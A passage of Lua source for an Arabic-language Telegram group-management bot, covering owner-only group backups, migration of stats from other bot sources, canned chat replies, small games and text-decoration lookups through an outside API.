local id = msg.id_
local msgs = { [0] = id}
local chat = msg.chat_id_
delete_msg(chat, msgs)
text = '✟︙عذرا عزيزي  [firstname](https://telegram.me/username) \n✟︙ممنوع الكفران هنا التزم فضلا .'
local text = text:gsub('firstname',(result.first_name_ or ''))
local text = text:gsub('username',(result.username_ or 'KASPER_ch'))
KASPERdx(msg.chat_id_, msg.id_, 1, text, 1, 'md')
end 
getUser(msg.sender_user_id_,get_warning)
end end
---------------------------- End Functions KASPER ----------------------------
----------------******* Started Code Source KASPER *******---------
if text == 'جلب نسخه الكروبات' and tonumber(msg.sender_user_id_) == tonumber(bot_owner) then
local list = KASPERdx1:smembers(KASPER..'bot:groups')  
local t = '{"BOT_ID": '..KASPER..',"GP_BOT":{'  
for k,v in pairs(list) do   
NAME = title_name(v) or ''
NAME = NAME:gsub('"','')
NAME = NAME:gsub('#','')
NAME = NAME:gsub([[\]],'')
link = KASPERdx1:get(KASPER.."bot:group:link"..v) or ''
welcome = KASPERdx1:get(KASPER..'welcome:'..v) or ''
MNSH = KASPERdx1:smembers(KASPER..'bot:monsh:'..v)
MDER = KASPERdx1:smembers(KASPER..'bot:owners:'..v)
MOD = KASPERdx1:smembers(KASPER..'bot:momod:'..v)
VIP = KASPERdx1:smembers(KASPER..'bot:vipmem:'..v)
if k == 1 then
t = t..'"'..v..'":{"GP_NAME":"'..NAME..'",'
else
t = t..',"'..v..'":{"GP_NAME":"'..NAME..'",'
end
if #VIP ~= 0 then 
t = t..'"VIP":['
for k,v in pairs(VIP) do
if k == 1 then
t =  t..'"'..v..'"'
else
t =  t..',"'..v..'"'
end end
t = t..'],'
end
if #MOD ~= 0 then
t = t..'"MOD":['
for k,v in pairs(MOD) do
if k == 1 then
t =  t..'"'..v..'"'
else
t =  t..',"'..v..'"'
end end   
t = t..'],'
end
if #MDER ~= 0 then
t = t..'"MDER":['
for k,v in pairs(MDER) do
if k == 1 then
t =  t..'"'..v..'"'
else
t =  t..',"'..v..'"'
end end   
t = t..'],'
end
if #MNSH ~= 0 then
t = t..'"MNSH":['
for k,v in pairs(MNSH) do
if k == 1 then
t =  t..'"'..v..'"'
else
t =  t..',"'..v..'"'
end end   
t = t..'],'
end
t = t..'"linkgroup":"'..link..'"}'
end
t = t..'}}'
local File = io.open('./'..bot_id..'.json', "w")
File:write(t)
File:close()
sendDocument(msg.chat_id_, msg.id_, 0, 1, nil, './'..KASPER..'.json', '✟︙عدد كروبات البوت : '..#list..'',dl_cb, nil)
end
--     By Developer KASPER     -- 
if text == 'رفع النسخه' and tonumber(msg.sender_user_id_) == tonumber(bot_owner) then   
if tonumber(msg.reply_to_message_id_) > 0 then
function by_reply(extra, result, success)   
if result.content_.document_ then 
local ID_FILE = result.content_.document_.document_.persistent_id_ 
local File_Name = result.content_.document_.file_name_
add_file(msg,msg.chat_id_,ID_FILE,File_Name)
end end
tdcli_function ({ ID = "GetMessage", chat_id_ = msg.chat_id_, message_id_ = tonumber(msg.reply_to_message_id_) }, by_reply, nil)
end end
--     By Developer KASPER     -- 
if text == 'نقل احصائيات تشاكي' and tonumber(msg.sender_user_id_) == tonumber(bot_owner) then   
local Users = KASPERdx1:smembers(KASPER.."Tshake:UsersBot")
local Groups = KASPERdx1:smembers(KASPER..'Tshake:Chek:Groups') 
for i = 1, #Groups do
KASPERdx1:sadd(KASPER..'bot:groups',Groups[i])  
KASPERdx1:sadd("KASPER:addg"..bot_id,Groups[i])  
KASPERdx1:set(KASPER.."bot:enable:"..Groups[i],true)
KASPERdx1:setex(KASPER.."bot:charge:"..Groups[i],86400,true)
local list1 = KASPERdx1:smembers(KASPER..'Tshake:Basic:Constructor'..Groups[i])
print(#list1)
for k,v in pairs(list1) do
KASPERdx1:sadd(KASPER.."bot:monsh:"..Groups[i], v)
end
local list2 = KASPERdx1:smembers(KASPER..'Tshake:Constructor'..Groups[i])
print(#list2)
for k,v in pairs(list2) do
KASPERdx1:sadd(KASPER.."bot:monsh2:"..Groups[i], v)
end
local list3 = KASPERdx1:smembers(KASPER..'Tshake:Manager'..Groups[i])
print(#list3)
for k,v in pairs(list3) do
KASPERdx1:sadd(KASPER.."bot:owners:"..Groups[i], v)
end
local list4 = KASPERdx1:smembers(KASPER..'Tshake:Mod:User'..Groups[i])
print(#list4)
for k,v in pairs(list4) do
KASPERdx1:sadd(KASPER.."bot:momod:"..Groups[i], v)
end
end
for i = 1, #Users do
KASPERdx1:sadd(KASPER..'bot:userss',Users[i])  
end
KASPERdx(msg.chat_id_, msg.id_, 1,'✟︙الحاله : نقل الاحصائيات ،\n         • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ •\n✟︙تم نقل : '..#Groups..' كروب ،\n✟︙تم نقل : '..#Users..' مشترك ،\n✟︙تم نقل المنشئين الاساسيين والثانويين ،\n✟︙تم نقل المدراء والادمنيه لكل المجموعات ،\n         • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ •\n✟︙التنصيب السابق للبوت { سورس تشاكي } ،', "md")
end
if text == 'نقل احصائيات الزعيم' and tonumber(msg.sender_user_id_) == tonumber(bot_owner) then   
local Users = KASPERdx1:smembers(KASPER..'users')
local Groups = KASPERdx1:smembers(KASPER..'group:ids') 
for i = 1, #Groups do
KASPERdx1:sadd(KASPER..'bot:groups',Groups[i])  
KASPERdx1:sadd("KASPER:addg"..bot_id,Groups[i])  
KASPERdx1:set(KASPER.."bot:enable:"..Groups[i],true)
KASPERdx1:setex(KASPER.."bot:charge:"..Groups[i],86400,true)
local list1 = KASPERdx1:smembers(KASPER..':MONSHA_Group:'..Groups[i])
print(#list1)
for k,v in pairs(list1) do
KASPERdx1:sadd(KASPER.."bot:monsh:"..Groups[i], v)
end
local list2 = KASPERdx1:smembers(KASPER..':MONSHA_BOT:'..Groups[i])
print(#list2)
for k,v in pairs(list2) do
KASPERdx1:sadd(KASPER.."bot:monsh2:"..Groups[i], v)
end
local list3 = KASPERdx1:smembers(KASPER..'owners:'..Groups[i])
print(#list3)
for k,v in pairs(list3) do
KASPERdx1:sadd(KASPER.."bot:owners:"..Groups[i], v)
end
local list4 = KASPERdx1:smembers(KASPER..'owners:'..Groups[i])
print(#list4)
for k,v in pairs(list4) do
KASPERdx1:sadd(KASPER.."bot:momod:"..Groups[i], v)
end
end
for i = 1, #Users do
KASPERdx1:sadd(KASPER..'bot:userss',Users[i])  
end
KASPERdx(msg.chat_id_, msg.id_, 1,'✟︙الحاله : نقل الاحصائيات ،\n         • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ •\n✟︙تم نقل : '..#Groups..' كروب ،\n✟︙تم نقل : '..#Users..' مشترك ،\n✟︙تم نقل المنشئين الاساسيين والثانويين ،\n✟︙تم نقل المدراء والادمنيه لكل المجموعات ،\n         • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ •\n✟︙التنصيب السابق للبوت { سورس الزعيم } ،', "md")
end
--     By Developer KASPER     -- 
if text and text:match("منو ضافني") or text:match("منو ضافني هنا") then
if not KASPERdx1:get(KASPER..'Added:Me'..msg.chat_id_) then
tdcli_function ({ID = "GetChatMember",chat_id_ = msg.chat_id_,user_id_ = msg.sender_user_id_},function(arg,da) 
if da and da.status_.ID == "ChatMemberStatusCreator" then
KASPERdx(msg.chat_id_, msg.id_, 1, '✟︙انت منشئ المجموعه .', 1, 'md')
return false
end
local Added_Me = KASPERdx1:get(KASPER.."Who:Added:Me"..msg.chat_id_..':'..msg.sender_user_id_)
if Added_Me then 
tdcli_function ({ID = "GetUser",user_id_ = Added_Me},function(extra,result,success)
local Name = '['..result.first_name_..'](tg://user?id='..result.id_..')'
Text = '*✟︙الشخص الذي ضافك هو* ⌯» '..Name
sendText(msg.chat_id_,Text,msg.id_/2097152/0.5,'md')
end,nil) else
KASPERdx(msg.chat_id_, msg.id_, 1, '✟︙انت دخلت عبر الرابط .', 1, 'md')
end end,nil) else
KASPERdx(msg.chat_id_, msg.id_, 1, '✟︙هذا الامر معطل من قبل المدراء .', 1, 'md')
end end 
--     By Developer KASPER     -- 
if KASPERdx1:get(KASPER.."SET:GAME" .. msg.chat_id_ .. "" .. msg.sender_user_id_) then  
if text and text:match("^(%d+)$") then
local NUM = text:match("^(%d+)$")
if tonumber(NUM) > 6 then
KASPERdx( msg.chat_id_, msg.id_, 1,"*✟︙يوجد فقط { 6 } اختيارات ارسل اختيارك مره اخرى .*\n", 1, "md")
return false  end 
local GETNUM = KASPERdx1:get(KASPER.."GAMES"..msg.chat_id_)
if tonumber(NUM) == tonumber(GETNUM) then
KASPERdx1:del(KASPER.."SET:GAME" .. msg.chat_id_ .. "" .. msg.sender_user_id_)   
KASPERdx( msg.chat_id_, msg.id_, 1,'\n*✟︙مبروك لقد ربحت  \n✟︙المحيبس باليد رقم { '..NUM..' } \n✟︙حصلت على {  5 } نقاط يمكن استبدالها برسائل ،*', 1, "md")
KASPERdx1:incrby(KASPER..'bot:add:num'..msg.chat_id_..msg.sender_user_id_,5)  
elseif tonumber(NUM) ~= tonumber(GETNUM) then
KASPERdx1:del(KASPER.."SET:GAME" .. msg.chat_id_ .. "" .. msg.sender_user_id_)   
KASPERdx( msg.chat_id_, msg.id_, 1,'\n*✟︙للاسف لقد خسرت  \n✟︙المحيبس باليد رقم { '..GETNUM..' } \n✟︙حاول مره اخرى للعثور على المحيبس  *', 1, "md")
end end end
--     By Developer KASPER     -- 
if KASPERdx1:get(KASPER.."bot:support:link" .. msg.sender_user_id_) then
if msg.content_.text_:match("(https://telegram.me/joinchat/%S+)") or msg.content_.text_:match("(https://t.me/joinchat/%S+)") then
local glink = msg.content_.text_:match("(https://telegram.me/joinchat/%S+)") or msg.content_.text_:match("(https://t.me/joinchat/%S+)")
local hash = "bot:supports:link"
KASPERdx1:set(KASPER..hash, glink)
KASPERdx(msg.chat_id_, msg.id_, 1, "✟︙تم حفظ رابط كروب الدعم ، ", 1, "md")
KASPERdx1:del(KASPER.."bot:support:link" .. msg.sender_user_id_)
elseif msg.content_.text_:match("^@(.*)[Bb][Oo][Tt]$") or msg.content_.text_:match("^@(.*)_[Bb][Oo][Tt]$") then
local bID = msg.content_.text_:match("@(.*)")
local hash = "bot:supports:link"
KASPERdx1:set(KASPER..hash, bID)
KASPERdx(msg.chat_id_, msg.id_, 1, "✟︙تم حفظ معرف الدعم ، ", 1, "md")
KASPERdx1:del(KASPER.."bot:support:link" .. msg.sender_user_id_)
end end
--     By Developer KASPER     -- 
if KASPERdx1:get(KASPER..'KASPER4'..msg.sender_user_id_) then
KASPERdx1:del(KASPER..'KASPER4'..msg.sender_user_id_)
local url , res = https.request('https://api.telegram.org/bot'..tokenbot..'/getChatAdministrators?chat_id='..msg.content_.text_..'')
local data = json:decode(url)
if res == 400 then
if data.description == "Bad Request: supergroup members are unavailable" then 
KASPERdx(msg.chat_id_,msg.id_, 1, "*✟︙لم ترفعني ادمن في قناتك ارفعني اولا ، *\n", 1 , "md")
return false 
elseif data.description == "Bad Request: chat not found" then 
KASPERdx(msg.chat_id_,msg.id_, 1, "*✟︙هذا المعرف ليس تابع لقناة *\n", 1 , "md")
return false
end end 
if not msg.content_.text_ then
KASPERdx(msg.chat_id_,msg.id_, 1, "*✟︙هذا المعرف ليس تابع لقناة *\n", 1 , "md")
return false
end
local CH_BOT = msg.content_.text_:match("(.*)")
KASPERdx1:set(KASPER..'KASPER3',CH_BOT)
KASPERdx(msg.chat_id_,msg.id_, 1, "✟︙تم حفظ القناة ، \n✟︙قم بتفعيل الاشتراك الاجباري الان ، \n", 1 , "html")
return false
end
--     By Developer KASPER     -- 
if KASPERdx1:get(KASPER.."bot:nerkh" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) then
KASPERdx1:del(KASPER.."bot:nerkh" .. msg.chat_id_ .. ":" .. msg.sender_user_id_)
local nerkh = msg.content_.text_:match("(.*)")
KASPERdx1:set(KASPER.."nerkh", nerkh)
KASPERdx(msg.chat_id_, msg.id_, 1, "✟︙تم حفظ كليشه المطور ،", 1, "md")
end
 --     By Developer KASPER     -- 
if text and text:match("^(.*)$") then
local KASPER = KASPERdx1:get('KASPER:'..bot_id..'namebot'..msg.sender_user_id_..'')
if KASPER == 'msg' then
KASPERdx(msg.chat_id_, msg.id_, 1, "✟︙تم حفظ اسم البوت الجديد ،", 1, "md")
KASPERdx1:set('KASPER:'..bot_id..'namebot'..msg.sender_user_id_..'', 'no')
KASPERdx1:set('KASPER:'..bot_id..'name_bot', text)
return false 
end end
--     By Developer KASPER     -- 
if KASPERdx1:get(KASPER..'bot:cmds'..msg.chat_id_) and not is_momod(msg.sender_user_id_, msg.chat_id_) then
print("Return False [Lock] [Cmd]")
else  
--     By Developer KASPER     -- 
 if text:match("^الرابط$") and KASPER11(msg) then
if not KASPERdx1:get(KASPER.."bot:tt:link:"..msg.chat_id_) then 
local link = KASPERdx1:get(KASPER.."bot:group:link"..msg.chat_id_)
if link then
KASPERdx(msg.chat_id_, msg.id_, 1, "✟︙*رابط المجموعة* .\n\n" .. link, 1, "md")
else 
KASPERdx(msg.chat_id_, msg.id_, 1, '✟︙لم يتم حفظ رابط المجموعه ارسل لي (ضع رابط) ليتم حفظه 📥 ،', 1, 'md')
end else
KASPERdx(msg.chat_id_, msg.id_, 1, '✟︙الرابط معطل لا يمكن ارساله ،', 1, 'md')
end end
if text and text:match("^القوانين$") or text and text:match("^قوانين$") then
local rules = KASPERdx1:get(KASPER..'bot:rules'..msg.chat_id_)
if rules then
KASPERdx(msg.chat_id_, msg.id_, 1, rules, 1, nil)
else
KASPERdx(msg.chat_id_, msg.id_, 1, '✟︙لم يتم وضع قوانين ، ', 1, 'md')
end end
--     By Developer KASPER     --
if text == "نسبه الحب" and KASPER11(msg) then
KASPERdx1:set(KASPER..'nsba'..msg.chat_id_..msg.sender_user_id_,'Check')
KASPER = '✟︙ارسل اسمك واسم الشخص الاخر ،\n✟︙مثال :- فايدر وفايدره ، '
KASPERdx(msg.chat_id_, msg.id_, 1,KASPER, 1, 'md')
end
if text and text ~="نسبه الحب"  and KASPERdx1:get(KASPER..'nsba'..msg.chat_id_..msg.sender_user_id_) == 'Check' then
tt = {"10","20","30","35","75","34","66","82","23","19","55","8","63","32","27","89","99","98","3","3","8","3","6","0",};
rr = tt[math.random(#tt)]
KASPER2 = '✟︙نسبه حب ، '..text..' هي : '..rr..'%'
KASPERdx(msg.chat_id_, msg.id_, 1,KASPER2, 1, 'md')
KASPERdx1:del(KASPER..'nsba'..msg.chat_id_..msg.sender_user_id_)
end
--     By Developer KASPER     --
if text and text:match("^احسب (.*)$") and KASPER11(msg) or text and text:match("^عمري (.*)$") and KASPER11(msg) then 
local TextAge = text:match("^احسب (.*)$") or text:match("^عمري (.*)$") 
UrlAge = https.request('https://apiabs.ml/age.php?age='..URL.escape(TextAge)) 
Age = JSON.decode(UrlAge)
t = Age.ok.abs
KASPERdx(msg.chat_id_, msg.id_, 1, t, 1, 'html')
end
--     By Developer KASPER     -- 
if text and text:match("^برج (.*)$") and KASPER11(msg)  or text and text:match("^برجي (.*)$") and KASPER11(msg) then 
local TextBrg = text:match("^برج (.*)$") or text:match("^برجي (.*)$") 
UrlBrg = https.request('https://apiabs.ml/brg.php?brg='..URL.escape(TextBrg)) 
Brg = JSON.decode(UrlBrg) 
t = Brg.ok.abs  
KASPERdx(msg.chat_id_, msg.id_, 1, t, 1, 'html')
end
if KASPERdx1:get(KASPER..'Zrf:add'..msg.chat_id_..''..msg.sender_user_id_) then 
if text == 'الغاء' then 
KASPERdx(msg.chat_id_, msg.id_, 1, '✟︙تم الغاء امر الزخرفه ،', 1, 'md')
KASPERdx1:del(KASPER..'Zrf:add'..msg.chat_id_..''..msg.sender_user_id_)
return false  
end 
UrlZrf = https.request('https://apiabs.ml/zrf.php?abs='..URL.escape(text)) 
Zrf = JSON.decode(UrlZrf) 
t = "✟︙قائمة الزخرفه ⬇️،\n         • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ •\n"
i = 0
for k,v in pairs(Zrf.ok) do
i = i + 1
t = t..i.." `"..v.."` \n"
end
KASPERdx(msg.chat_id_, msg.id_, 1, t, 1, 'md')
KASPERdx1:del(KASPER..'Zrf:add'..msg.chat_id_..''..msg.sender_user_id_)
return false   
end
--     By Developer KASPER     -- 
if text == 'زخرفه' and KASPER11(msg) or text == 'الزخرفه' and KASPER11(msg)  then  
KASPERdx1:setex(KASPER.."Zrf:add"..msg.chat_id_..""..msg.sender_user_id_,10000,true)
KASPERdx(msg.chat_id_, msg.id_, 1, '✟︙ لي الكلمه لزخرفتها \n✟︙ الزخرفه باللغه : { en } ~ { ar } ', 1, 'md')
end
--     By Developer KASPER     -- 
if text and text:match("^زخرفه (.*)$") or text and text:match("^زخرف (.*)$") then 
local TextZrf = text:match("^زخرفه (.*)$") or text:match("^زخرف (.*)$") 
UrlZrf = https.request('https://apiabs.ml/zrf.php?abs='..URL.escape(TextZrf)) 
Zrf = JSON.decode(UrlZrf) 
t = "✟︙قائمة الزخرفه ⬇️،\n         • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ •\n"
i = 0
for k,v in pairs(Zrf.ok) do
i = i + 1
t = t..i.."⌯ `"..v.."` \n"
end
KASPERdx(msg.chat_id_, msg.id_, 1, t, 1, 'md')
end
--     By Developer KASPER     -- 
if text == 'دي' or text == 'ديي' or text == 'دي بابه' then if not KASPERdx1:get(KASPER..'bot:rep:mute'..msg.chat_id_) then local KASPER = { "آخـلُِآقٌڪ آلُِعٍآر 😐✨","أتجاوزكك بسرعتي أمريي لله 🙁🙌🏾"}  KASPERdx12 = math.random(#KASPER) KASPERdx(msg.chat_id_, msg.id_, 1, KASPER[KASPERdx12] , 1, 'md') end end
if text == 'السلام عليكم' or text == 'سلام عليكم' or text == 'سلام'  then if not KASPERdx1:get(KASPER..'bot:rep:mute'..msg.chat_id_) then KASPER =  "ياھَہّلْاا ۅﻋ̝̚لْيڪْم الْﺳ̭͠ لْام 𖠙 🤤♥️" else KASPER = '' end KASPERdx(msg.chat_id_, msg.id_, 1, KASPER, 1, 'md') end
if text == '😭💔' or text == '😭😭' or text == '😭😭😭' or text == '😿💔' or text == '😭😭😭' or text == '😭😭😭😭' then if not KASPERdx1:get(KASPER..'bot:rep:mute'..msg.chat_id_) then KASPER =  "شبيكك حياتيي 🥺💘" else KASPER = '' end KASPERdx(msg.chat_id_, msg.id_, 1, KASPER, 1, 'md') end
if text == '🌚💔' or text == '💔🌚' or text == '🚶‍♂💔' or text == '💔' or text == '😔💔' or text == '🚶‍♀💔' or text == '😭' then if not KASPERdx1:get(KASPER..'bot:rep:mute'..msg.chat_id_) then KASPER =  "شبّيي الحلو 😿💔" else KASPER = '' end KASPERdx(msg.chat_id_, msg.id_, 1, KASPER, 1, 'md') end
if text == 'باي' or text == 'بااي' or text == 'اروح' or text == 'اروح احسن' or text == 'اولي احسن' or text == 'راح اروح' or text == 'باي انام' then if not KASPERdx1:get(KASPER..'bot:rep:mute'..msg.chat_id_) then KASPER =  "توككل بس خلصنةه 🌝😂" else KASPER = '' end KASPERdx(msg.chat_id_, msg.id_, 1, KASPER, 1, 'md') end
if text == 'هلو' or text == 'هلاو' or text == 'هلا' or text == 'هلاوو' or text == 'هيلاو' or text == 'هيلاوو' or text == 'هلاا' then if not KASPERdx1:get(KASPER..'bot:rep:mute'..msg.chat_id_) then local KASPER = {  "اࠗط็لق֯ق֯ هٞللاࠗ୨و 𖠙 🤤♥️" ,  "هۂَلاا نۨہٰورتت يعمۘري 𖠙 🤤♥️" } KASPERdx12 = math.random(#KASPER) KASPERdx(msg.chat_id_, msg.id_, 1, KASPER[KASPERdx12] , 1, 'md') end end
if text == 'شونك' or text == 'شونج' or text == 'شلونك' or text == 'شلونج' or text == 'شونكم' or text == 'شلونكم' or text == 'شلخبار' or text == 'شلون الاخبار' or text == 'شخبارك' then if not KASPERdx1:get(KASPER..'bot:rep:mute'..msg.chat_id_) then  local KASPER = {  "ني زينن وانت يعمريي 🥺💘" ,  "ماشيهه يعمري 😻💘",  "تمامم عمرري وانتت 🤤💘", } KASPERdx12 = math.random(#KASPER) KASPERdx(msg.chat_id_, msg.id_, 1, KASPER[KASPERdx12] , 1, 'md') KASPERdx(msg.chat_id_, msg.id_, 1, KASPER, 1, 'md') end end
if text == 'وينك' or text == 'وينج' then  if not KASPERdx1:get(KASPER..'bot:rep:mute'..msg.chat_id_) then KASPER =  "مْوٌجہوٌدِ يہمْگُ يحلوُ  😉♥️" else KASPER = '' end KASPERdx(msg.chat_id_, msg.id_, 1, KASPER, 1, 'md') end
if text == 'بوت ملطلط' then  if not KASPERdx1:get(KASPER..'bot:rep:mute'..msg.chat_id_) then KASPER =  "ربي صبرني 😞🌾" else  KASPER = '' end  KASPERdx(msg.chat_id_, msg.id_, 1, KASPER, 1, 'md') end
if text == 'نايمين' or text == 'ميتين' then  if not KASPERdx1:get(KASPER..'bot:rep:mute'..msg.chat_id_) then KASPER =  "ني سهران احرسكمم 😻🍃" else  KASPER = '' end  KASPERdx(msg.chat_id_, msg.id_, 1, KASPER, 1, 'md') end
if text == 'هلوباي' or text == 'هلو باي' then  if not KASPERdx1:get(KASPER..'bot:rep:mute'..msg.chat_id_) then KASPER =  "رايحح لو جايي ، 😻😹" else  KASPER = '' end  KASPERdx(msg.chat_id_, msg.id_, 1, KASPER, 1, 'md') end
if text == 'اكلك' or text == 'اكلج' or text == 'اكلكم' then if not KASPERdx1:get(KASPER..'bot:rep:mute'..msg.chat_id_) then KASPER =  "ڪوولُِ مآڪوولُِ لُِآحٍدِ  😉♥️" else KASPER = '' end KASPERdx(msg.chat_id_, msg.id_, 1, KASPER, 1, 'md') end
if text == 'فرخ' then  if not KASPERdx1:get(KASPER..'bot:rep:mute'..msg.chat_id_) then KASPER =  "ٰوينۨہهۂَ خۡل احۡصرهۂَ ، 😹♥️" else  KASPER = '' end  KASPERdx(msg.chat_id_, msg.id_, 1, KASPER, 1, 'md') end
if text == 'سورس فايدر' or text == 'سورس ديف فايدر' or text == 'سورس انور'  then if not KASPERdx1:get(KASPER..'bot:rep:mute'..msg.chat_id_) then KASPER =  "تااج وباجج حبيي ، 😹🌝" else KASPER = '' end KASPERdx(msg.chat_id_, msg.id_, 1, KASPER, 1, 'md') end 
if text == 'احبك' then  if not KASPERdx1:get(KASPER..'bot:rep:mute'..msg.chat_id_) then local KASPER = { "ٰجذابةه تريدد تقطكك  ، 😹💘","ءني هم احبكك يعمري ، ☹️💘" } KASPERdx12 = math.random(#KASPER) KASPERdx(msg.chat_id_, msg.id_, 1, KASPER[KASPERdx12] , 1, 'md') end end
if text == 'احبج' then  if not KASPERdx1:get(KASPER..'bot:rep:mute'..msg.chat_id_) then local KASPER =  { "ٰجذابب يريد يطككج ، 😹💘","ااخ بسس اموتت بيكك ، 🥺💘" } KASPERdx12 = math.random(#KASPER) KASPERdx(msg.chat_id_, msg.id_, 1, KASPER[KASPERdx12] , 1, 'md') end end
if text == 'بوت' and KASPER11(msg) then  name_bot = (KASPERdx1:get('KASPER:'..bot_id..'name_bot') or 'فايدر')  local KASPER = {  "أسمي "..name_bot.." يعمري ",  "أسمي "..name_bot.." يقميل ",  "تره أسمي "..name_bot.." كافي بوت ",  "انت البوت لك اسمي "..name_bot.." ", }  KASPER2 = math.random(#KASPER) KASPERdx(msg.chat_id_, msg.id_, 1, KASPER[KASPER2] , 1, 'md')  end
if (text and text == (KASPERdx1:get('KASPER:'..bot_id..'name_bot') or 'فايدر')) then name_bot = (KASPERdx1:get('KASPER:'..bot_id..'name_bot') or 'فايدر') local namebot = {  'عيون '..name_bot..' العسليات ؛🤭☄',  'اطلقق من يصيح '..name_bot..' ؛😻💗',  'وياك '..name_bot..' عمري أمرني 🌾' } name = math.random(#namebot) KASPERdx(msg.chat_id_, msg.id_, 1, namebot[name] , 1, 'md') return false end
--     By Developer KASPER     -- 
if text =='نقاطي' and KASPER11(msg) then 
if tonumber((KASPERdx1:get(KASPER..'bot:add:num'..msg.chat_id_..msg.sender_user_id_) or 0)) == 0 then
KASPER0 = '✟︙ليس لديك نقاط العب اولا ، \n✟︙للعب ارسل { الالعاب } .'
KASPERdx(msg.chat_id_, msg.id_, 1,KASPER0, 1, 'md')
else
KASPER = '✟︙لديك ('..(KASPERdx1:get(KASPER..'bot:add:num'..msg.chat_id_..msg.sender_user_id_))..') نقطه ،'
KASPERdx(msg.chat_id_, msg.id_, 1,KASPER, 1, 'md')
end end
--     By Developer KASPER     -- 
if text ==  'مسح رسائلي' and KASPER11(msg) then
KASPERdx1:del('KASPER:'..bot_id..'nummsg'..msg.chat_id_..msg.sender_user_id_)
KASPERdx(msg.chat_id_, msg.id_, 1, '✟︙تم مسح رسائلك المضافه . ', 1, 'md')
end
--     By Developer KASPER     --
if text == 'سمايلات' then
if KASPERdx1:get(KASPER..'bot:lock_geam'..msg.chat_id_) then
KASPERdx(msg.chat_id_, msg.id_, 1, '✟︙الالعاب معطله من قبل الادمن \n✟︙ارسل { تفعيل اللعبه } لتفعيلها ', 1, 'md')
return "KASPER"
end
KASPERdx1:del(KASPER..'bot:l:ids'..msg.chat_id_)
KASPER2 = {'🍏','🍎','🍐','🍊','🍋','🍌','🍉','🍇','🍓','🍈','??','🍑','🍍','🥥','🥝','🍅','🍆','🥑','🥦','??','🌶','🌽','🥕','🥔','🍠','🥐','🍞','🥖','🥨','🧀','🥚','🍳','🥞','🥓','🥩','🍗','🍖','🌭','🍔','🍟','🍕','🥪','🥙','🍼','☕️','🍵','🥤','🍶','🍺','🍻','🏀','⚽️','🏈','⚾️','🎾','🏐','🏉','🎱','🏓','🏸','🥅','🎰','🎮','🎳','🎯','🧼','🎻','🎸','??','🥁','🎹','🎼','🎧','🎤','🎬','🎨','🎭','🎪','🛎','🩸','🎗','🏵','🎖','🧼','🥌','🛷','🚕','🚗','🚙','🚌','🚎','🏎','🚓','🚑','🚚','🚛','🚜','🇮🇶','⚔️','🛡','🔮','🌡','💣','⏱','🛢','📓','📗','📂','📅','📪','📫','📬','📭','⏰','📺','🎚','☎️','📡'}
name = KASPER2[math.random(#KASPER2)]
KASPERdx1:set(KASPER..'bot:klmos'..msg.chat_id_,name)
name = string.gsub(name,'🍞','🍞') name = string.gsub(name,'🥖','🥖') name = string.gsub(name,'🥨','🥨') name = string.gsub(name,'🧀','🧀')
name = string.gsub(name,'🥚','🥚') name = string.gsub(name,'🍳','🍳') name = string.gsub(name,'🥞','🥞') name = string.gsub(name,'🥓','🥓')
name = string.gsub(name,'🥩','🥩') name = string.gsub(name,'🍗','🍗') name = string.gsub(name,'🍖','🍖') name = string.gsub(name,'🌭','🌭')
name = string.gsub(name,'🍔','🍔') name = string.gsub(name,'🍟','🍟') name = string.gsub(name,'🍕','🍕') name = string.gsub(name,'🥪','🥪')
name = string.gsub(name,'🥙','🥙') name = string.gsub(name,'🍼','🍼') name = string.gsub(name,'☕️','☕️') name = string.gsub(name,'🍵','🍵')
name = string.gsub(name,'🥤','🥤') name = string.gsub(name,'🍶','🍶') name = string.gsub(name,'🍺','🍺') name = string.gsub(name,'🍏','🍏')
name = string.gsub(name,'🍎','🍎') name = string.gsub(name,'🍐','🍐') name = string.gsub(name,'🍊','🍊') name = string.gsub(name,'🍋','🍋')
name = string.gsub(name,'🍌','🍌') name = string.gsub(name,'🍉','🍉') name = string.gsub(name,'🍇','🍇') name = string.gsub(name,'🍓','🍓')
name = string.gsub(name,'🍈','🍈') name = string.gsub(name,'🍒','🍒') name = string.gsub(name,'🍑','🍑') name = string.gsub(name,'🍍','🍍')
name = string.gsub(name,'🥥','🥥') name = string.gsub(name,'🥝','🥝') name = string.gsub(name,'🍅','🍅') name = string.gsub(name,'🍆','🍆')
name = string.gsub(name,'🥑','🥑') name = string.gsub(name,'🥦','🥦') name = string.gsub(name,'🥒','🥒') name = string.gsub(name,'🌶','🌶')
name = string.gsub(name,'🌽','🌽') name = string.gsub(name,'🥕','🥕') name = string.gsub(name,'🥔','🥔') name = string.gsub(name,'🍠','🍠')
name = string.gsub(name,'🥐','🥐') name = string.gsub(name,'🍻','🍻') name = string.gsub(name,'🏀','🏀') name = string.gsub(name,'⚽️','⚽️')
name = string.gsub(name,'🏈','🏈') name = string.gsub(name,'⚾️','⚾️') name = string.gsub(name,'🎾','🎾') name = string.gsub(name,'🏐','🏐')
name = string.gsub(name,'🏉','🏉') name = string.gsub(name,'🎱','🎱') name = string.gsub(name,'🏓','🏓') name = string.gsub(name,'🏸','🏸')
name = string.gsub(name,'🥅','🥅') name = string.gsub(name,'🎰','🎰') name = string.gsub(name,'🎮','🎮') name = string.gsub(name,'🎳','🎳')
name = string.gsub(name,'🎯','🎯') name = string.gsub(name,'🧼','🧼') name = string.gsub(name,'🎻','🎻') name = string.gsub(name,'🎸','🎸')
name = string.gsub(name,'🎺','🎺') name = string.gsub(name,'🥁','🥁') name = string.gsub(name,'🎹','🎹') name = string.gsub(name,'🎼','🎼')
name = string.gsub(name,'🎧','🎧') name = string.gsub(name,'🎤','🎤') name = string.gsub(name,'🎬','🎬') name = string.gsub(name,'🎨','🎨')
name = string.gsub(name,'🎭','🎭') name = string.gsub(name,'🎪','🎪') name = string.gsub(name,'🛎','🛎') name = string.gsub(name,'🩸','🩸')
name = string.gsub(name,'🎗','🎗') name = string.gsub(name,'🏵','🏵') name = string.gsub(name,'🎖','🎖') name = string.gsub(name,'🧼','🧼')
name = string.gsub(name,'🥌','🥌') name = string.gsub(name,'🛷','🛷') name = string.gsub(name,'🚕','🚕') name = string.gsub(name,'🚗','🚗')
name = string.gsub(name,'🚙','🚙') name = string.gsub(name,'🚌','🚌') name = string.gsub(name,'🚎','🚎') name = string.gsub(name,'🏎','🏎')
